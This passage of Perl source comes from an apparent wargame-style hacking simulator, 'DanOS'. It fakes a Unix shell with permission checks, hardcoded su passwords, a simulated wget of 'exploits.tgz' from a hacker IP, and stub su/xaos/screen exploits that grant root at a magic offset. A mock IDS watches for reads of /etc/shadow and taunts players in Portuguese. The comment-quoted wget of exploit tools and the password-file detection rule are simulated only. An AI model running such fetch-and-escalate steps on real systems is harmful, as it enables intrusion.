   my $inode = "";
   my $access = "";

   return if ($dir eq ".");
   if ((substr($dir,length($dir)-1,1) eq "/") &&  $dir ne "/")
   {
      $dir = substr($dir,0,length($dir)-1);
   }
   if ($dir eq "")
   {
      $longpath = $home;
   }
   else
   {
      if ($dir eq "..")
      {
         $longpath = updir($pwd);
         $longpath = "/" if ($longpath eq "");
      }
      elsif ($dir eq "~")
      {
         $longpath = "$home";
      }
      elsif (substr($dir,0,1) ne "/")
      {
         my $bkpdir = $pwd;
         $bkpdir = "" if ($pwd eq "/");
         $longpath = "$bkpdir/$dir";
      }
      else
      {
         $longpath = $dir;
      }
   }
   $inode = indexofdir($longpath);
   if ($inode eq "x")
   {
      print STDERR "bash: cd: $dir: No such file or directory\n";
   }
   else
   {
      $access = $dirs_acesso[$inode];
      $access = "1" if ($login eq "root");
      if ($access eq "0")
      {
         print STDERR "bash: cd: $dir: Permission denied\n";
      }
      else
      {
         $pwd = $longpath;
      }
   }
}

sub listfiles
{
   my $dir = $_[0];
   my $longpath = "";
   my $inode = "";
   my $access = "";
   my $dirsub = "";

   if ((substr($dir,length($dir)-1,1) eq "/") &&  $dir ne "/")
   {
      $dir = substr($dir,0,length($dir)-1);
   }
   $dir = "" if (substr($dir,0,1) eq "-");
   if ($dir eq "")
   {
      $longpath = $pwd;
   }
   else
   {
      if (substr($dir,0,1) eq "/")
      {
         $longpath = $dir;
      }
      else
      {
         $longpath = "$pwd/$dir";
         $longpath = "$pwd$dir" if ($pwd eq "/");

      }
   }
   $inode = indexofdir($longpath);
   if ($inode eq "x")
   {
      print STDERR "/bin/ls: $dir: No such file or directory\n";
   }
   else
   {
      $access = $dirs_acesso[$inode];
      $access = "1" if ($login eq "root");
      if ($access eq "0")
      {
         print STDERR "ls: $dir: Permission denied\n";
      }
      else
      {
         $dirsub = "list_$inode";
         &$dirsub;
         if ($exploit_location ne "0")
         {
            if ($exploit_location eq "1")
            {
               if ($longpath eq "/home/joao")
               {
                  print STDERR $download_content;
               }
            }
            else
            {
               if ($longpath eq "/tmp")
               {
                  print STDERR $download_content;
               }
            }
         }
      }
   }
}

sub catfile
{
   my $file = $_[0];
   my $longpath = "";
   my $inode = "x";
   my $access = "0";
   my $filesub = "";

   if ($file eq "")
   {
      print STDERR "/bin/cat: Missing filename\n";
      return;
   }
   else
   {
      if (substr($file,0,1) ne "/")
      {
         $longpath = "/$file";
         $longpath = "$pwd/$file" if ($pwd ne "/");
      }
      else
      {
         $longpath = $file;
      }
   }
   $inode = indexoffile($longpath);
   if ($inode eq "x")
   {
      print STDERR "/bin/cat: $file: No such file or directory\n";
   }
   else
   {
      $inode = indexofcat($longpath);

      if ($inode eq "x")
      {
         print STDERR "cat: $file: Is a Binary\n";
      }
      else
      {
         $access = $catfiles_acesso[$inode];
         $access = "1" if ($login eq "root");
         if ($access eq "1")
         {
            if ($ids_running eq "1")
            {
               if (($longpath eq "/etc/shadow") || ($longpath eq "/etc/passwd"))
               {
                  activeids("unauthorized password database access");
               }
            }
            $filesub = "cat_$inode";
            &$filesub;
         }
         else
         {
            print STDERR "cat: $file: Permission denied\n";
         }
      }
   }
}

sub indexofdir
{
   my $dir = $_[0];
   my $inode = "x";
   my $cnt = 0;
   my $diretorio = "";

   S: for $cnt (0 .. $#dirs)
   {
      $diretorio = $dirs[$cnt];
      if ($diretorio eq $dir)
      {
         $inode = $cnt;
         last S;
      }
   }
   return $inode;
}

sub indexoffile
{
   my $file1 = $_[0];
   my $inode = "x";
   my $cnt = 0;
   my $arquivo = "";

   S: for $cnt (0 .. $#files)
   {
      $arquivo = $files[$cnt];
      if ($arquivo eq $file1)
      {
         $inode = $cnt;
         last S;
      }
   }
   return $inode;
}

sub indexofcat
{
   my $file1 = $_[0];
   my $inode = "x";
   my $cnt = 0;
   my $arquivo = "";

   S: for $cnt (0 .. $#catfiles)
   {
      $arquivo = $catfiles[$cnt];
      if ($arquivo eq $file1)
      {
         $inode = $cnt;
         last S;
      }
   }
   return $inode;
}

sub updir
{
   # /var/lib/apache
   $s = $_[0];
   my $l = length($s);
   do {$l = $l - 1;} until ((substr($s,$l,1) eq "/") || ($l == 0));
   return substr( $s, 0, $l);
}

sub firsthost
{
   # exercito.mil.br
   # pchazard.com.br

   $s = $_[0];
   my $l = length($s);
   my $p = 0;
   do {$p = $p + 1;} until ((substr($s,$p,1) eq ".") || ($p == $l));
   return substr( $s, 0, $p);
}

sub simulate_su
{
   my $su_login = $_[0];
   my $authed = "x";

   print STDERR "Password: ";
   my $su_pass = get();
   $authed = auth($su_login, $su_pass);
   if ($authed eq "x")   
   {
      print STDERR "Sorry.\n";
   }
   else
   {
      become_root() if ($authed eq "0");
   }
}

sub hacktimeouted
{
   activeids("unauthorized priviledge elevation");
}

sub become_root
{
   $uid = "0";
   $gid = "0";
   $login = "root";
   $promptstate = "#";
   # Activate the DanOS's IDS, the best intrusion detection system of the
   # world... :-) well mr. hacker, you have 60 seconds to do what you need...
   # bash-2.03#
   $SIG{ALRM} = sub { &hacktimeouted };
   alarm 60;
   increment("data/rootaram.dat");
   
}

sub activeids
{
   # unauthorized priviledge elevation
   # unauthorized password database access
   my $cause = $_[0];
   my $msgnum = 0;
   # Mensagens de consolo para o "hacker" em um mal dia...
   my @mensagens = (

"Voce eh apenas mais um lammer que tentou invadir meu sistema e que foi
chutado pelo meu IDS. Eu tenho o sistema mais seguro do mundo, e mesmo
que voce consiga root no meu sistema nunca irah muito longe !",

"Se com o melhor voce mecher, como o resto irah morrer !!!",

"Voce eh incapaz de invadir meu sistema, nao passa de um grande wannabe",

"Eu te peguei! Mas vc nao foi o unico, ateh o Cheat Struck jah levou um peh
na bunda do meu IDS !!! Nao fique contrariado, nao eh vc que eh ruim, meu
sistema de seguranca que eh realmente muito bom !",

"Vah embora larva, nao pode com o meu sistema!",

"Ora ora, o que temos aki, um peixe mordeu a isca! Pena que eh muito
pequeno...",

"Hey lamah, tera de fazer melhor do que isso se quiser ir a algum lugar...",

"Eh o melhor que pode fazer ? Eh melhor voltar para o BO e NetBus que vc
terah mais sorte...",

"Gostou do meu IDS ?",

"Ah, o lamerzinho nao conseguiu seguir a receitinha de bolo ? Que pena,
que peninha....",

"Oh, o scriptkiddie se deu mal! Espero que nao tenha machucado muito..."

);
   

   alarm 0;
   print STDERR $clear;
   print STDERR "\n" x 5;
   print STDERR "

$azul_claro==============================================================================$vermelho_claro
                      DanOS Intrusion Detection System
                   Copyright (c) 2001 Danix Software, Inc.
$azul_claro==============================================================================$verde_claro 

Cause:$normal $cause $branco_claro

 The DanOS IDS detected anormal activity in your user space, probably caused
 by hacker activity. If you are not doing anything wrong, please contact the
   local system administrator to soft the rules associated with your user.           $laranja

              You will be disconnected from system in 20 seconds

$azul_claro==============================================================================$normal

";
   sleep 20;
   print STDERR "Message from sysadmin$branco_claro [root (tty1)]$normal:\n\n";
   my $msgtxt = $mensagens[ rand @mensagens ];
   print STDERR "$msgtxt\n\n";
   bye();
}

sub auth
{
   my $l = $_[0];
   my $s = $_[1];
   my $res = "x";

#   dumper($l);
#   dumper($s);
   $res = "100" if (($l eq "joao") && ($s eq "alessandra"));
   $res = "0" if (($l eq "root") && ($s eq "lorenaNme"));
   return $res;
}

sub simulate_wget
{
   # wget http://200.241.235.22/exploits.tgz
   # wget http://$hackerip/exploits.tgz                          
   my $url = $_[0];
   my $filename;

   # Separamos o host do arquivo
   $filename = getfilename($url,"/");
   $url = substr($url,0,(length($url)-length($filename)-1));
   $url = getfilename($url,"/");
   # Agora $filename="exploits.tgz" e $url="200.241.235.22"

   print STDERR "--09:46:05--  http://$url:80/$filename\n";
   print STDERR "           => `$filename'\n";
   if (($pwd ne "/home/joao") && ($pwd ne "/tmp"))
   {
      print STDERR "\nCannot create file $filename: Permission Denied.\n";
      return;
   }
   print STDERR "Connecting to $url:80... ";
   sleep(3);
   if (!hostexists($url))
   {
      print STDERR "\n$url: Host not found.\n";
      return;
   }
   if (($url ne "$hackerip") && ($url ne "$hackerhost"))
   {
      print STDERR "\nConnection to $url:80 refused.\n";
      return;
   }
   print STDERR "connected!\n";
   print STDERR "HTTP request sent, awaiting response... ";
   sleep(1);
   if ($filename ne "exploits.tgz")
   {
      print STDERR "404 Not Found\n09:46:05 ERROR 404: Not Found.\n\n";
      return;
   }
   if ($exploit_location ne "0")
   {
      print STDERR "403 Access Forbiden\n09:46:05 ERROR 403: Access Forbiden.\n\n";
      return;
   }
   print STDERR "200 OK\nLength: 3,114 [application/x-tar]\n\n    0K -> ";
   sleep 1;
   print STDERR ".";
   sleep 1;
   print STDERR ".";
   sleep 1;
   print STDERR ".                                                    [100%]\n\n";
   print STDERR "09:46:05 (1.12 KB/s) - `$filename' saved [3114/3114]\n";
   $exploit_location = "1";
   $exploit_location = "2" if ($pwd eq "/tmp");
   &uncompress;
}

sub hostexists
{
   my $host = $_[0];
   my $exists = 0;

   $exists = 1 if ($host eq "localhost");
   $exists = 1 if ($host eq "127.0.0.1");
   $exists = 1 if ($host eq "$hostname");
   $exists = 1 if ($host eq "$serverip");
   $exists = 1 if ($host eq "$hackerhost");
   $exists = 1 if ($host eq "$hackerip");
   $exists = 1 if ($host eq "lorena.$hostname");
   $exists = 1 if ($host eq "200.2.4.5");
   return $exists;
}

sub getfilename
{
   # "http://200.241.235.22/exploits.tgz" or
   # "-rwxr-xr-x   1 root     bin        437844 Sep  2  1999 bash"
   my $long = $_[0];
                        
   # "/" or " "
   my $sep = $_[1];

   my $l = length($long);

   do {$l = $l - 1;} until ((substr($long,$l,1) eq "$sep") || ($l == 0));
   return substr( $long, $l+1, length($long));
}

sub uncompress
{
   print STDERR "$lowhostname:$pwd$promptstate ";
   slowrite("tar zxvf exploits.tgz\n");
   print STDERR << "EOT";
xaosx.c
screenx.c
sux.c
EOT
   print STDERR "$lowhostname:$pwd$promptstate ";
   slowrite("ls -la\n");
   if ($pwd eq "/tmp")
   {
      &list_70;
   }
   else
   {
      &list_30;
   }
   print STDERR "$sources";
   print STDERR "$lowhostname:$pwd$promptstate ";
   slowrite("gcc -o xaosx xaosx.c\n");
   sleep 2;
   print STDERR "$lowhostname:$pwd$promptstate ";
   slowrite("gcc -o screenx screenx.c\n");
   sleep 2;
   print STDERR "$lowhostname:$pwd$promptstate ";
   slowrite("gcc -o sux sux.c\n");
   sleep 2;
   print STDERR "$lowhostname:$pwd$promptstate ";
   slowrite("rm *.c *.o\n");
   push @files, "$pwd/xaosx";
   push @files, "$pwd/screenx";
   push @files, "$pwd/sux";
   $exploit_pwd = $pwd;
}

sub cancat
{
   # /usr/bin/cat
   my $file = $_[0];
   my $path = extractfilepath($file);
   my $res = "1";

   $res = "0" if ($path eq "/usr/bin");
   $res = "0" if ($path eq "/boot");
   $res = "0" if ($path eq "/bin");
   $res = "0" if ($path eq "/usr/sbin");
   $res = "0" if ($path eq "/sbin");
   $res = "0" if ($path eq "/usr/bin");
   $res = "0" if (substr($path,0,4) eq "/dev");
   $res = "0" if (substr($path,0,5) eq "/proc");
   $res = "0" if (substr($path,0,4) eq "/mnt");
   $res = "0" if (substr($path,0,4) eq "/lib");
   $res = "0" if (substr($path,0,8) eq "/usr/lib");
   $res = "0" if (substr($path,0,13) eq "/home/ftp/bin");
   $res = "0" if (substr($path,0,13) eq "/misc/drivers");
   $res = "0" if (substr($path,0,8) eq "/mnt/w95");

   return $res;
}

sub isbinary
{
   my $file = $_[0];
   my $ext = extractfileext($file);
   my $res = "0";

   $res = "1" if ($ext eq "jpg");
   $res = "1" if ($ext eq "mpg");
   $res = "1" if ($ext eq "mp3");
   $res = "1" if ($ext eq "gz");
   return $res;
}


sub extractfileext
{
   my $s = $_[0];
   my $l = length($s);

   do {$l = $l - 1;} until ((substr($s,$l,1) eq ".") || ($l == 0));
   return substr( $s, $l+1, length($s));
}

sub extractfilepath
{
   my $file = $_[0];
   my $l = length($file);

   do {$l = $l - 1;} until ((substr($file,$l,1) eq "\/") || ($l == 0));
   return substr( $file, 0, $l);
}

sub extractfilename
{
   #/usr/bin/cat
   $s = $_[0];
   my $l = length($s);
   do {$l = $l - 1;} until ((substr($s,$l,1) eq "/") || ($l == 0));
   return substr( $s, $l+1, length($s));
}

sub su_exploit
{
   my $offset = $_[0];

   $offset = "500" if ($offset eq "");
   $len = $offset - 50;
   print STDERR "/bin/su exploit by pcHazard <cybercrash\@ig.com.br>\n";
   print STDERR "Try offsets between -2500 to 2500 in steps of 500\n";
   print STDERR "Using offset: $offset\nlen: $len\n";

   sleep 3;
   if ($offset eq "1500")
   {
      $hacked = 1;
      become_root();
   }
}

sub xaos_exploit
{
   my $offset = $_[0];

   $offset = "500" if ($offset eq "");
   $len = $offset - 50;
   print STDERR "/usr/bin/xaos exploit by pcHazard <cybercrash\@ig.com.br>\n";
   print STDERR "Try offsets between -1500 to 2500 in steps of 500\n";
   print STDERR "Using offset: $offset\nlen: $len\n";
   sleep 3;
}

sub screen_exploit
{
   my $offset = $_[0];

   $offset = "500" if ($offset eq "");
   $len = $offset - 50;
   print STDERR "/usr/bin/screen exploit by pcHazard <cybercrash\@ig.com.br>\n";
   print STDERR "Try offsets between -1500 to 2500 in steps of 500\n";
   print STDERR "Using offset: $offset\nlen: $len\n";
   sleep 3;

}

sub increment
{
   my $data = $_[0];
   my $tamanho = 5;
   my $count;

   if (!-e $data)
   {
      open(COUNT,"> $data");
      print COUNT "0\n";
      close COUNT;
   }
   open(COUNT,"$data");
   $count = <COUNT>;
   close(COUNT);
   chop($count) if $count =~ /\n$/;
   $count = $count + 1;
   open(COUNT,"> $data");
   print COUNT "$count\n";
   close COUNT;
   my $sup = "";
   my $zeros = 0;
   if (length($count) < $tamanho)
   {
      $zeros = $tamanho-length($count);
      $sup = "0" x $zeros;
   }
   return "$sup$count";
}

sub readfile
{
   my $data = $_[0];
   my $tamanho = 5;
   my $count;

   if (!-e $data)
   {
      open(COUNT,"> $data");
      print COUNT "0\n";
      close COUNT;
   }
   open(COUNT,"$data");
   $count = <COUNT>;
   close(COUNT);
   chop($count) if $count =~ /\n$/;
   my $sup = "";
   my $zeros = 0;
   if (length($count) < $tamanho)
   {
      $zeros = $tamanho-length($count);
      $sup = "0" x $zeros;
   }
   return "$sup$count";
}

sub clear
{
   my $s = $_[0];
   my $l = 0;

   do {$l = $l + 1} until ((substr($s,$l,1) eq chr(13)) || ($l == length($s)));
   return substr( $s, 0, $l);
}

sub dumper
{
   my $txt = $_[0];
   my $cnt;
   my $letra;

   print STDERR "\n";
   for $cnt (0 .. length($txt))
   {
      $letra = substr($txt,$cnt,1);
      $code =  ord($letra);
      print STDERR "(\"$letra\" [$code])\n";
   }
   print STDERR "\n";
}

sub win
{
   print STDERR "$clear$vermelho_claro";
   slowrite("Voce venceu o desafio do DanOS RELEASE 1.0.0\n",0.1);
   slowrite("Diga seu nome: ",0.1);
   print STDERR "$branco_claro";
   my $name = get();
   print STDERR "$vermelho_claro";
   slowrite("Diga seu e-mail: ",0.1);
   print STDERR "$branco_claro";
   my $mail = get();
   print STDERR "$vermelho_claro";
   slowrite("Escreva uma mensagem para o sysadmin do DanOS: ",0.1);
   print STDERR "$branco_claro";
   my $msg = get();
   open(ARQ,">> data/hall.dat");
   print ARQ "$name <$mail>:$msg\n";
   close(ARQ);
   print STDERR $branco_claro;
   sleep(5);
   print STDERR "$clear$normal";
   slowrite("Connection lost.\n",0.1);
   print STDERR "$normal";
   exit;
}

# Para prevenir contra confusoes do CR-LF que difere de um
# carregamento local do programa e de uma abertura remota pelo inetd

sub get
{
   my $res = <STDIN>;
   my $cnt;

   for $cnt (0 .. length($res))
   {
      my $code = ord(substr($res,$cnt,1));
      if (($code == 13) || ($code == 10))
      {
         substr($res,$cnt,length($res)) = "";
         #dumper($res);
         return $res;
      }
   }
}



